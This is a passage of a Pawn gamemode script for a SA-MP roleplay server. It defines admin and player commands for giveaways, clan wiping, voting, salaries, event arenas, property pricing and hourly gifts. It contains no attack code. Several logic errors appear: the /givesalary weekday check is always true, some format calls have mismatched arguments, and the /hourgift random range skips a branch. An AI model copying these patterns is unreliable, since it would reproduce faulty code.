	}
	else
	{
 		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{ff0000}[inchise]\n", stringz2, DynamicFactions[6][fName],GetFactionMembers(6), DynamicFactions[6][fMaxMembers]);
	}
 	if(DynamicFactions[8][fApplication] > 0)
  	{
		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{00FF00}[deschise]\n", stringz2, DynamicFactions[8][fName],GetFactionMembers(8), DynamicFactions[8][fMaxMembers]);
	}
	else
	{
 		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{ff0000}[inchise]\n", stringz2, DynamicFactions[8][fName],GetFactionMembers(8), DynamicFactions[8][fMaxMembers]);
	}
 	if(DynamicFactions[9][fApplication] > 0)
  	{
		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{00FF00}[deschise]\n", stringz2, DynamicFactions[9][fName],GetFactionMembers(9), DynamicFactions[9][fMaxMembers]);
	}
	else
	{
 		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{ff0000}[inchise]\n", stringz2,  DynamicFactions[9][fName],GetFactionMembers(9), DynamicFactions[9][fMaxMembers]);
	}
 	if(DynamicFactions[10][fApplication] > 0)
   	{
		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{00FF00}[deschise]\n", stringz2, DynamicFactions[10][fName],GetFactionMembers(10), DynamicFactions[10][fMaxMembers]);
	}
	else
	{
 		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{ff0000}[inchise]\n", stringz2, DynamicFactions[10][fName],GetFactionMembers(10), DynamicFactions[10][fMaxMembers]);
	}
 	if(DynamicFactions[11][fApplication] > 0)
  	{
		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{00FF00}[deschise]\n", stringz2, DynamicFactions[11][fName],GetFactionMembers(11), DynamicFactions[11][fMaxMembers]);
	}
	else
	{
 		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{ff0000}[inchise]\n", stringz2, DynamicFactions[11][fName],GetFactionMembers(11), DynamicFactions[11][fMaxMembers]);
	}
 	if(DynamicFactions[12][fApplication] > 0)
  	{
		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{00FF00}[deschise]\n", stringz2, DynamicFactions[12][fName],GetFactionMembers(12), DynamicFactions[12][fMaxMembers]);
	}
	else
	{
 		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{ff0000}[inchise]\n", stringz2, DynamicFactions[12][fName],GetFactionMembers(12), DynamicFactions[12][fMaxMembers]);
	}
 	if(DynamicFactions[13][fApplication] > 0)
  	{
		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{00FF00}[deschise]\n", stringz2, DynamicFactions[13][fName],GetFactionMembers(13), DynamicFactions[13][fMaxMembers]);
	}
	else
	{
 		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{ff0000}[inchise]\n", stringz2, DynamicFactions[13][fName],GetFactionMembers(13), DynamicFactions[13][fMaxMembers]);
	}
 	if(DynamicFactions[14][fApplication] > 0)
  	{
		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{00FF00}[deschise]\n", stringz2, DynamicFactions[14][fName],GetFactionMembers(14), DynamicFactions[14][fMaxMembers]);
	}
	else
	{
 		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{ff0000}[inchise]\n", stringz2, DynamicFactions[14][fName],GetFactionMembers(14), DynamicFactions[14][fMaxMembers]);
	}
	if(DynamicFactions[15][fApplication] > 0)
  	{
		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{00FF00}[deschise]\n", stringz2, DynamicFactions[15][fName],GetFactionMembers(15), DynamicFactions[15][fMaxMembers]);
	}
	else
	{
 		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{ff0000}[inchise]", stringz2, DynamicFactions[15][fName],GetFactionMembers(15), DynamicFactions[15][fMaxMembers]);
	}
	format(MGLOBAL, sizeof(MGLOBAL), "Factiune\tMembrii\tStatus aplicatii\n%s",stringz2);
	ShowPlayerDialog(playerid, DIALOG_APLICA, DIALOG_STYLE_TABLIST_HEADERS, "Aplica pentru o factiune...",MGLOBAL,"Aplica", "CANCEL");
	return 1;
}*/
//COMANDA PENTRU MENIUL DE MOBILA.
/*CMD:mobila(playerid, params[])
{
	new houseID = PlayerInfo[playerid][pPhousekey];
	new houseID2 = PlayerInfo[playerid][pPhousekey];
	if(houseID == 999 && houseID2 == 999) return SCM(playerid, COLOR_ERROR, "Nu ai o casa");
	if(gPlayerLogged[playerid] == 0) return SCM(playerid, COLOR_ERROR, "Trebuie sa te autentifici pe server.");
	if(InHouse[playerid] == houseID || InHouse[playerid] == houseID2)
	{
	    ShowHouseMenu(playerid);
	}
	else
	{
	    SCM(playerid, COLOR_ERROR, "Nu esti in casa ta");
	}
	return 1;
}*/
CMD:payday(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 7)
	{
		PayDay();
	}
	return 1;
}
CMD:snow(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 7)
	{
		new zapada2;
		if(sscanf(params, "i", zapada2)) return SCM(playerid, COLOR_ERROR, "/snow [1 = ON, 0 = OFF]");
		zapada = zapada2;
		if(zapada == 1) SCM(playerid, COLOR_SERVER, "The snow has been enabled.");
		if(zapada == 0) SCM(playerid, COLOR_SERVER, "The snow has been disabled.");
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(IsPlayerConnected(i))
			{
				if(zapada == 1)
				{
					DestroySnow(i);
					if(IsPlayerInArea(playerid, 44.60, -2892.90, 2997.00, -768.00))
					{
						CreateSnow(i);
					}	
				}
				if(zapada == 0)
				{
					DestroySnow(i);
				}
			}	
		}
	}	
	return 1;
}
CMD:setppstock(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 7)
	{
	    new nrstock, nrpp;
		if(sscanf(params, "ii", nrstock, nrpp)) return SCM(playerid, COLOR_ERROR, "/setppstock [stock] [amount (pp)]");
		stockpp = nrstock;
		sumapp = nrpp;
		format(MGLOBAL, sizeof(MGLOBAL), "SERVER BONUS: {FFFFFF}%s a activated command [/getpp], limited supply: (%d).",GetName(playerid),nrstock);
		SendClientMessageToAll(COLOR_SERVER, MGLOBAL);
		format(MGLOBAL, sizeof(MGLOBAL), "SERVER BONUS: {FFFFFF}If you be among the receive %d which will the key [/getpp] You will receive the %d Premium Points.",nrstock,nrpp);
        SendClientMessageToAll(COLOR_SERVER, MGLOBAL);
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(IsPlayerConnected(i))
			{
				afolositgetpp[i] = 0;
			}
		}
	}
	return 1;
}
CMD:setvipstock(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 7)
	{
	    new nrstock;
		if(sscanf(params, "i", nrstock)) return SCM(playerid, COLOR_ERROR, "/setvipstock [stock]");
		stockvip = nrstock;
		format(MGLOBAL, sizeof(MGLOBAL), "SERVER BONUS: {FFFFFF}%s a activated command [/getvip], limited supply: (%d).",GetName(playerid),nrstock);
		SendClientMessageToAll(COLOR_SERVER, MGLOBAL);
		format(MGLOBAL, sizeof(MGLOBAL), "SERVER BONUS: {FFFFFF}If you be among the receive %d which will the key [/getvip] You will receive your VIP account.",nrstock);
        SendClientMessageToAll(COLOR_SERVER, MGLOBAL);
		foreach(Player, i)
		{
		    afolositgetpp[i] = 0;
		}
	}
	return 1;
}
CMD:getpp(playerid, params[])
{
	if(stockpp > 0)
	{
	    if(afolositgetpp[playerid] == 0)
	    {
		    stockpp--;
		    format(MGLOBAL, sizeof(MGLOBAL), "SERVER BONUS: {FFFFFF}%s Received %d Points Premium, remained: %d [/getpp] in stock.", GetName(playerid), sumapp, stockpp);
		    SendClientMessageToAll(COLOR_SERVER, MGLOBAL);
		    PlayerInfo[playerid][pPremiumPoints] += sumapp;
		    Update(playerid, pPremiumPointsx);
		    afolositgetpp[playerid] = 1;
 		}
 		else
 		{
 		    SCM(playerid, COLOR_ERROR, "You have already used this command!");
 		}
	}
	else
	{
	    SCM(playerid, COLOR_ERROR, "They are no longer [/getpp] in stock.");
	}
	return 1;
}
CMD:getvip(playerid, params[])
{
	if(stockvip > 0)
	{
	    if(afolositgetpp[playerid] == 0)
	    {
			if(PlayerInfo[playerid][pVip] > 0) return SCM(playerid, COLOR_ERROR, "You already have the VIP Account.");
		    stockvip--;
		    format(MGLOBAL, sizeof(MGLOBAL), "SERVER BONUS: {FFFFFF}%s Has received VIP Account, remained: %d [/getvip] in stock.", GetName(playerid), stockvip);
		    SendClientMessageToAll(COLOR_SERVER, MGLOBAL);
		    PlayerInfo[playerid][pVip] += 1;
		    Update(playerid, pVipx);
		    afolositgetpp[playerid] = 1;
 		}
 		else
 		{
 		    SCM(playerid, COLOR_ERROR, "You have already used this command!");
 		}
	}
	else
	{
	    SCM(playerid, COLOR_ERROR, "They are no longer [/getvip] in stock.");
	}
	return 1;
}
CMD:removeallclans(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 7)
	{
    	if(PlayerInfo[playerid][pClan] > 0 && PlayerInfo[playerid][pCRank] > 6)
		{
		    new var100[1000],quqerry[1000];
			format(quqerry, sizeof(quqerry), "SELECT * FROM `clans` WHERE `clanID` > '0' AND `clanActive`='1' ORDER BY `clanID`");
			new Cache: stringresult8 = mysql_query(SQL, quqerry);
			if(cache_get_row_count() > 0)
			{
			    new pid,clanrank,punctepremium;
				format(quqerry, sizeof(quqerry), "SELECT * FROM `users` WHERE `Clan` > '0'");
				new Cache: stringresult9 = mysql_query(SQL, quqerry);
				for(new id, jd = cache_get_row_count (); id != jd; ++id)
				{
					pid = cache_get_field_content_int(id, "id");
					clanrank = cache_get_field_content_int(id, "CRank");
					punctepremium = cache_get_field_content_int(id, "PremiumPoints");
					if(clanrank < 7)
					{
						mysql_format(SQL, var100, sizeof(var100), "INSERT INTO `emails` (`playerid`,`Message`) VALUES('%d','All those who have been in this clan have been wiped out because of all the mafia clans have been deleted by the %s, are to receive the 1,000PP back to the clan.')",pid,GetName(playerid));
						mysql_tquery(SQL,var100,"","");
					}
					else
					{
					    punctepremium += 1000;
					    mysql_format(SQL, var100, sizeof(var100), "INSERT INTO `emails` (`playerid`,`Message`) VALUES('%d','All those who have been in this clan have been wiped out because of all the mafia clans have been deleted by the %s, being leader you received 1,000PP back to your clan.')",pid,GetName(playerid));
						mysql_tquery(SQL,var100,"","");
						mysql_format(SQL, var100, sizeof(var100), "UPDATE `users` SET `PremiumPoints`='%d' WHERE `id`='%d'",punctepremium,pid);
						mysql_tquery(SQL,var100,"","");
					}
				}
				cache_delete(stringresult9);
				mysql_format(SQL, var100, sizeof(var100), "UPDATE `users` SET `Clan`='0',`CRank`='0',`ClanTag`='0', `ClanWarns`='0' WHERE `Clan` > '0'");
				mysql_tquery(SQL,var100,"","");
				mysql_format(SQL, var100, sizeof(var100), "UPDATE `clans` SET `clanActive`='0' WHERE `clanID` > '0'");
				mysql_tquery(SQL,var100,"","");
				mysql_format(SQL, var100, sizeof(var100), "UPDATE `clans` SET `clanName`='None',`clanTag`='[NONE]',`clanMOTD`='Expired',`clanActive`='0' WHERE `clanID` > '0'");
				mysql_tquery(SQL,var100,"","");
                mysql_format(SQL, var100, sizeof(var100), "TRUNCATE TABLE clans");
				mysql_tquery(SQL,var100,"","");
			}
			cache_delete(stringresult8);
		}
	}
	return 1;
}
CMD:startvote(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	{
		if(PlayerInfo[playerid][pAdmin] >= 5)
		{
		    new id1,id2,id3,level,q[200],s1[500],sender[75],s2[75];
	        if(sscanf(params, "s[200]iiid",q,id1,id2,id3,level))
			{
		 		SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/startvote <Question> <Player 1> <Player 2> <Player 3> <0/1>");
		 		return 1;
			}
			if(activevot == 1) return SCM(playerid, -1, "{FF9966}(!)It is a vote active.");
			if(level == 0)
			{
			    GetPlayerName(playerid,sender,sizeof(sender));
			    format(s1,500,"(( Admin %s has put the next question: Who you want to be the mayor of the town of? ))",sender,q);
				SendClientMessageToAll(COLOR_GENANNOUNCE,s1);
				SendClientMessageToAll(COLOR_GENANNOUNCE,"((To vote for the new mayor of the city, type the command [/vote].))");
				activevot = 1;
				voted1[playerid] = id1;
				voted2[playerid] = id2;
				voted3[playerid] = id3;
				allvoted = 1;
			}
			if(level == 1)
			{
			 	GetPlayerName(playerid,s2,sizeof(s2));
			 	format(s1,250,"(( Admin %s has put the next question: %s ))",s2,q);
				SendClientMessageToAll(COLOR_GENANNOUNCE,s1);
				SendClientMessageToAll(COLOR_GENANNOUNCE,"((To vote, type the command [/vote].))");
				activevot = 1;
				voted1[playerid] = id1;
				voted2[playerid] = id2;
				voted3[playerid] = id3;
				adminsvoted = 1;
			}
			foreach(Player,i)
			{
			    voted[i] = 0;
			}
		}
		else return SCM(playerid,-1,AdminOnly);
	}
	return 1;
}
CMD:hshop(playerid, params[])
{
    if(PlayerInfo[playerid][pHelper] >= 1)
	{
	    new str1[128];
	    format(str1, sizeof(str1), "shop helper | points: {A9C4E4}%d", PlayerInfo[playerid][pHelpedPlayers]);
	    ShowPlayerDialog(playerid, DIALOG_HSHOP, DIALOG_STYLE_TABLIST_HEADERS, str1,"Item\tPrice\n{FFFFFF}$3,000,000\t{A9C4E4}50\n{FFFFFF}Clear FP\t{A9C4E4}70\n{FFFFFF}Hidden Color\t{A9C4E4}100\n{FFFFFF}+1 Vehicle Slot\t{A9C4E4}500\n{FFFFFF}Premium Account\t{A9C4E4}1.000", "Select","CANCEL");
	}
    return 1;
}
CMD:givesalary(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	{
	    if(GetWeekDay() != 6 || GetWeekDay() != 7) return SCM(playerid, -1, "{FF0033}You only pay out a share Saturday and Sunday.");
	    if(PlayerInfo[playerid][pLeader] != 0)
	    {
	        new id, s1[500], s2[500];
	        if(sscanf(params, "i",id))
			{
		 		SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/givesalary <Player/Name>");
		 		return 1;
			}
			if(PlayerInfo[playerid][pLeader] == PlayerInfo[id][pMember])
			{
				new money,sender[75],giv[75];
				money = (50000 + PlayerInfo[id][pLevel]) * PlayerInfo[id][pPaydayuri];
				GivePlayerCash(id, money);
				GetPlayerName(playerid,sender,75);
				GetPlayerName(id,giv,75);
				format(s2,500,"Leader %s He gave you pay, amount: %s. Payday-uri: %d.",FormatNumber(money),PlayerInfo[id][pPaydayuri]);
				SCM(id,COLOR_YELLOW,s2);
				format(s1,500,"Leader %s and he gave his salary %s, amount: $%s.",sender,giv,FormatNumber(money));
				SendFamilyMessage(PlayerInfo[id][pMember],COLOR_LEADER,s1);
				PlayerInfo[id][pPaydayuri] = 0;
				Update(id, pCashx);
				Update(id, pPaydayurix);
			}
			else return SCM(playerid, -1,"{FF0033}That Player Is Not In Your Factions.");
		}
	    else return SCM(playerid, -1, "{FF0033}You are not a leader.");
	}
	return 1;
}
CMD:vote(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	{
	    if(activevot == 0) return SCM(playerid, -1, "{FF9966}(!)There is no active voting.");
	    if(voted[playerid] == 1) return SCM(playerid, -1,"{FF0033}You already voted.");
     	new vot1[75],vot2[75],vot3[75],s3[500];
	    if(allvoted == 1)
	    {
	     	GetPlayerName(voted1[playerid],vot1,sizeof(vot1));
	     	GetPlayerName(voted2[playerid],vot2,sizeof(vot2));
	     	GetPlayerName(voted3[playerid],vot3,sizeof(vot3));
	     	format(s3,500,"%s\n%s\n%s",vot1,vot2,vot3);
			ShowPlayerDialog(playerid, DIALOG_VOTE,DIALOG_STYLE_LIST,"Vote:",s3,"Vote","Cancel");
		}
		if(PlayerInfo[playerid][pAdmin] >= 1 && adminsvoted == 1)
		{
		  GetPlayerName(voted1[playerid],vot1,sizeof(vot1));
		  GetPlayerName(voted2[playerid],vot2,sizeof(vot2));
		  GetPlayerName(voted3[playerid],vot3,sizeof(vot3));
		  format(s3,500,"%s\n%s\n%s",vot1,vot2,vot3);
		  ShowPlayerDialog(playerid, DIALOG_VOTE,DIALOG_STYLE_LIST,"Vote:",s3,"Vote","Cancel");
		}
		else return SCM(playerid, -1,"{FF0033}Only admins can vote.");
	}
	return 1;
}
CMD:mp3(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pMP3] == 0) return SCM(playerid, -1, "You Dont Have MP3 , You can Buy it Form /Shop.");
	ShowPlayerDialog(playerid, DIALOG_MP3, DIALOG_STYLE_LIST, "MP3 Radio:","{0066FF}Radio{FFFFFF} Kiss FM\n{0066FF}Radio{FFFFFF} Pro Fm\n{0066FF}Radio{FFFFFF} Taraf\n{0066FF}Radio{FFFFFF} Bandit\n{0066FF}Radio{FFFFFF} Hot Style\n{0066FF}Radio{FFFFFF} Diz\n{0066FF}Radio{FFFFFF} Tequila\n{0066FF}Radio {FFFFFF}TopZone Radio\nTurn off radio","Ok","Cancel");
	return 1;
}
CMD:stopvote(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	{
	    if(PlayerInfo[playerid][pAdmin] >= 5)
	    {
	        new s1[500],s2[500],vot1[75],vot2[75],vot3[75];
	    	if(activevot == 0) return SCM(playerid, -1, "{FF9966}(!)There is no active voting.");
	    	format(s1,500,"(( Admin %s the oprt vote. ))",GetName(playerid));
			SendClientMessageToAll(COLOR_GENANNOUNCE,s1);
			GetPlayerName(voted1[playerid], vot1,75);
			GetPlayerName(voted2[playerid], vot2,75);
			GetPlayerName(voted3[playerid], vot3,75);
			format(s2,500,"(( %s: %d || %s: %d || %s: %d ))",vot1,candidat1,vot2,candidat2,vot3,candidat3);
			SendClientMessageToAll(COLOR_GENANNOUNCE,s2);
			activevot = 0;
			voted1[playerid] = -1;
			voted2[playerid] = -1;
			voted3[playerid] = -1;
			candidat1 = 0;
			candidat2 = 0;
			candidat3 = 0;
			foreach(Player,i)
			{
			    voted[i] = 0;
			}
		}
		else return SCM(playerid, -1, AdminOnly);
	}
	return 1;
}
CMD:hourpoints(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
        new string[1266];
        format(string, sizeof(string), "You have %d/1 HourPoints points at x/x can be used [/hourgift].", PlayerInfo[playerid][pGPoints]);
		SendClientMessage(playerid, COLOR_SERVER, string);
	}
	return 1;
}
CMD:eventarenagun(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	{
	    if(PlayerInfo[playerid][pAdmin] >= 3)
	    {
	        if(activateareagun == 0)
	        {
	            activateareagun = 1;
	            SCM(playerid, -1, "Arena Gun On.");
	        }
	        else if(activateareagun == 1)
	        {
	            activateareagun = 0;
	            SCM(playerid, -1, "Arena Gun Off.");
	        }
	    }
	}
    return 1;
}
CMD:eventareatank(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	{
	    if(PlayerInfo[playerid][pAdmin] >= 5)
	    {
	        if(eventareatankk == 0)
	        {
	            eventareatankk = 1;
	            SCM(playerid, -1, "Arena Tank On.");
	        }
	        else if(eventareatankk == 1)
	        {
	            eventareatankk = 0;
	            SCM(playerid, -1, "Arena Tank Off.");
	        }
	    }
	}
    return 1;
}
CMD:gettank(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	{
	    if(spawnsetarea[playerid] == 1)
	    {
	        if(eventareatankk == 1)
	        {
				SCM(playerid, -1, "Is not finalized.");
			}
			else SCM(playerid, -1, "No tanks are activated in event arena.");
		}
		else SCM(playerid, -1, "You're in no event arena.");
	}
	return 1;
}
CMD:getweapons(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	{
	    if(spawnsetarea[playerid] == 1)
	    {
	        if(activateareagun == 1)
	        {
				ShowPlayerDialog(playerid,Dialog_getweaponsarea,DIALOG_STYLE_LIST,"Select:","RPG\nMiniGun\nDesert eagle\nRocket Luncher\nMP5\nAK47\nM4\nTec 9\nCombat ShotGun\nGrenade\nArmour","Select","Cancel");
			}
			else SCM(playerid, -1, "No weapons are activated in event arena.");
		}
		else SCM(playerid, -1, "You're in no event arena.");
	}
	return 1;
}
CMD:edit(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	{
	    if(PlayerInfo[playerid][pAdmin] > 5)
	    {
	        new x_job[200],money,level;
	        if(sscanf(params, "s[200]ii",x_job,money,level)) return SCM(playerid, 0xFFFFFFFF, "Usage: /edit <house/biz> <money> <level>");
			if(strcmp(x_job,"house",true) == 0)
			{
			    for(new h = 1; h < sizeof(HouseInfo); h++)
				{
					if(PlayerToPoint(2.0, playerid, HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez]) && HouseInfo[h][hOwned] == 0)
					{
					    if(money > 0 && level > 0)
					    {
							if(money > 100000000) return SCM(playerid, -1, "Price must be less than or equal $100,000,000.");
							if(level > 999 || level < 1) return SCM(playerid, -1, "The level must be less than or equal to or greater than 999 0.");
							HouseInfo[h][hLevel] = level;
                            HUpdate(h,hLevelx);
                            HouseInfo[h][hValue] = money;
                            HUpdate(h,hValuex);
                            OnPropTextdrawUpdate(1,h);
						}
					}
				}
			}
			if(strcmp(x_job,"biz",true) == 0)
			{
			    for(new b = 1; b < sizeof(BizzInfo); b++)
				{
				    if(PlayerToPoint(2.0, playerid, BizzInfo[b][bEntranceX], BizzInfo[b][bEntranceY], BizzInfo[b][bEntranceZ]) && BizzInfo[b][bOwned] == 0)
			        {
			            if(money > 0 && level > 0)
					    {
					        new str[500];
							if(money > 100000000) return SCM(playerid, -1, "Price must be less than or equal to $100,000,000.");
							if(level > 999 || level < 1) return SCM(playerid, -1, "The level must be less than or equal to or greater than 999 0.");
                            BizzInfo[b][bLevelNeeded] = level;
                            BizzInfo[b][bBuyPrice] = money;
		   					mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `LevelNeeded`='%d' WHERE `ID`='%d'",BizzInfo[b][bLevelNeeded],b);
							mysql_tquery(SQL,str,"","");
							mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `BuyPrice`='%d' WHERE `ID`='%d'",BizzInfo[b][bBuyPrice],b);
							mysql_tquery(SQL,str,"","");
							OnPropTextdrawUpdate(2,b);
						}
			        }
				}
			}
	    }
	    else return SCM(playerid, -1, AdminOnly);
	}
	return 1;
}
CMD:hourgift(playerid, params[])
{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerToPoint(5.0, playerid, 1785.4000000,-1361.3000000,14.8000000))
	        {
			    if(PlayerInfo[playerid][pGPoints] >= 1)
			    {
					    new cadou = random(9)+2;
					    if(cadou == 1)
					    {
					        GivePlayerCash(playerid, 25000);
					        Update(playerid, pCashx);
					        PlayerInfo[playerid][pGPoints] -= 1;
					        Update(playerid, pGPointsx);
					        new gift[128];
					        new name[MAX_PLAYER_NAME];
					        GetPlayerName(playerid, name, sizeof(name));
					        format(gift, sizeof(gift),"* %s received a gift! [25.000$]",name);
							ProxDetector(10.0, playerid, gift,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
					        GameTextForPlayer(playerid, "~g~25,000$!", 5000, 1);
					        return 1;
						}
						if(cadou == 2)
						{
							GivePlayerCash(playerid, 30000);
							PlayerInfo[playerid][pGPoints] -= 1;
					        Update(playerid, pGPointsx);
					        Update(playerid, pCashx);
							new gift[128];
							new name[MAX_PLAYER_NAME];
					        GetPlayerName(playerid, name, sizeof(name));
					        format(gift, sizeof(gift),"* %s received a gift! [30.000$]",name);
							ProxDetector(10.0, playerid, gift,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
							GameTextForPlayer(playerid, "~g~30,000$!", 5000, 1);
							return 1;
						}
						if(cadou == 3)
						{
						    GivePlayerCash(playerid, 50000);
						    PlayerInfo[playerid][pGPoints] -= 1;
					        Update(playerid, pGPointsx);
				         	Update(playerid, pCashx);
                            new gift[128];
                            new name[MAX_PLAYER_NAME];
					        GetPlayerName(playerid, name, sizeof(name));
					        format(gift, sizeof(gift),"* %s received a gift! [50.000$]",name);
							ProxDetector(10.0, playerid, gift,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
						    GameTextForPlayer(playerid, "~g~50,000$!", 5000, 1);
						    return 1;
						}
						if(cadou == 4)
						{
							GivePlayerCash(playerid, 100000);
							PlayerInfo[playerid][pGPoints] -= 1;
					        Update(playerid, pGPointsx);
					        Update(playerid, pCashx);
					        new gift[128];
					        new name[MAX_PLAYER_NAME];
					        GetPlayerName(playerid, name, sizeof(name));
					        format(gift, sizeof(gift),"* %s received a gift! [100.000$]",name);
							ProxDetector(10.0, playerid, gift,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
							GameTextForPlayer(playerid, "~g~100,000$!", 5000, 1);
							return 1;
						}
						if(cadou == 5)
						{
						    GivePlayerCash(playerid, 150000);
						    Update(playerid, pCashx);
						    PlayerInfo[playerid][pGPoints] -= 1;
					        Update(playerid, pGPointsx);
					        new gift[128];
					        new name[MAX_PLAYER_NAME];
					        GetPlayerName(playerid, name, sizeof(name));
					        format(gift, sizeof(gift),"* %s received a gift! [150.000$]",name);
							ProxDetector(10.0, playerid, gift,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
						    GameTextForPlayer(playerid, "~g~150,000$!", 5000, 1);
						    return 1;
						}
						if(cadou == 6)
						{
						    PlayerInfo[playerid][pExp] += 1;
						    Update(playerid, pRP);
						    PlayerInfo[playerid][pGPoints] -= 1;
					        Update(playerid, pGPointsx);
					        new gift[128];
					        new name[MAX_PLAYER_NAME];
					        GetPlayerName(playerid, name, sizeof(name));
					        format(gift, sizeof(gift),"* %s received a gift! [+1 Respect Points]",name);
							ProxDetector(10.0, playerid, gift,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
						    GameTextForPlayer(playerid, "~g~1 Respect points", 5000, 1);
						    return 1;
						}
					    if(cadou == 7)
					    {
					        PlayerInfo[playerid][pExp] += 2;
					        Update(playerid, pRP);
					        PlayerInfo[playerid][pGPoints] -= 1;
					        Update(playerid, pGPointsx);
					        new gift[128];
					        new name[MAX_PLAYER_NAME];
					        GetPlayerName(playerid, name, sizeof(name));
					        format(gift, sizeof(gift),"* %s received a gift! [+2 Respect Points]",name);
							ProxDetector(10.0, playerid, gift,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
					        GameTextForPlayer(playerid, "~g~2 Respect points", 5000, 1);
					        return 1;
						}
						if(cadou == 8)
						{
						    PlayerInfo[playerid][pExp] += 3;
						    Update(playerid, pRP);
						    PlayerInfo[playerid][pGPoints] -= 1;
					        Update(playerid, pGPointsx);
					        new gift[128];
					        new name[MAX_PLAYER_NAME];
					        GetPlayerName(playerid, name, sizeof(name));
					        format(gift, sizeof(gift),"* %s received a gift! [+3 Respect Points]",name);
							ProxDetector(10.0, playerid, gift,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
						    GameTextForPlayer(playerid, "~g~3 Respect points", 5000, 1);
						    return 1;
						}
						if(cadou == 9)
						{
						    GivePlayerCash(playerid, 200000);
						    Update(playerid, pCashx);
						    PlayerInfo[playerid][pGPoints] -= 1;
					        Update(playerid, pGPointsx);
					        new gift[128];
					        new name[MAX_PLAYER_NAME];
					        GetPlayerName(playerid, name, sizeof(name));
					        format(gift, sizeof(gift),"* %s received a gift! [200.000$]",name);
							ProxDetector(10.0, playerid, gift,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
						    GameTextForPlayer(playerid, "~g~200,000$!", 5000, 1);
						    return 1;
						}
						if(cadou == 10)
						{
						    PlayerInfo[playerid][pRob] += 1;
						    PlayerInfo[playerid][pGPoints] -= 1;
					        Update(playerid, pGPointsx);
					        Update(playerid, pRobx);
					        new gift[128];
					        new name[MAX_PLAYER_NAME];
					        GetPlayerName(playerid, name, sizeof(name));
					        format(gift, sizeof(gift),"* %s received a gift! [+1 Rob Points]",name);
							ProxDetector(10.0, playerid, gift,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
						    GameTextForPlayer(playerid, "~g~1 Rob points", 5000, 1);
						    return 1;
						}
						if(cadou == 11)
						{
						    PlayerInfo[playerid][pRob] += 2;
						    PlayerInfo[playerid][pGPoints] -= 1;
					        Update(playerid, pGPointsx);
